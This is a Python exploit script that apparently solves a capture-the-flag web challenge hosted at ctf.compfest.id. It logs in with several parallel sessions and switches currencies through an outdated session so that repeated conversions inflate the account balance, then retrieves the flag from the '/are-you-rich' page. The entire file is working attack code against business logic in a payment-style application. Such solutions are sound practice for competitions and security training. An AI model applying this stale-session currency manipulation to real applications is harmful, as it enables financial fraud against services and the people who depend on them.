import requests
import time

BASE_URL = "http://ctf.compfest.id:7303"
USERNAME = "testexploiter"
PASSWORD = "testexploiter123"


def register_user():
    data = {"username": USERNAME, "password": PASSWORD, "confirm_password": PASSWORD}
    requests.post(f"{BASE_URL}/register", data=data)


def login(session):
    session.post(f"{BASE_URL}/login", data={"username": USERNAME, "password": PASSWORD})


def change_currency(session, currency):
    session.post(f"{BASE_URL}/change-currency", data={"currency": currency})


def get_balance(session):
    r = session.get(f"{BASE_URL}/")
    # print(r.text.split("YOUR BALANCE")[1].split(" "))
    return float(r.text.split("YOUR BALANCE")[1].split(" ")[1])


def get_flag(session):
    r = session.get(f"{BASE_URL}/are-you-rich")
    if "FLAG" in r.text:
        return r.text.split("FLAG")[1].split("}")[0] + "}"
    return None


# Initialize user
register_user()

# Setup sessions
s_main = requests.Session()
s_race1 = requests.Session()
s_race2 = requests.Session()

login(s_main)
login(s_race1)
login(s_race2)

# Set initial currency to AUD
change_currency(s_race1, "AUD")
change_currency(s_race2, "AUD")

print(f"Starting balance: {get_balance(s_main)} AUD")

for cycle in range(1, 4):
    # High-rate conversion (to EUR)
    change_currency(s_race1, "EUR")

    # Low-rate conversion (to IDR) using outdated session
    change_currency(s_race2, "IDR")

    # Convert back to AUD
    change_currency(s_race1, "AUD")

    print(f"Cycle {cycle} balance: {get_balance(s_main):,.2f} AUD")

# Get flag
flag = get_flag(s_main)
if flag:
    print(f"Success! Flag: {flag}")
else:
    print("Exploit failed - balance not high enough")
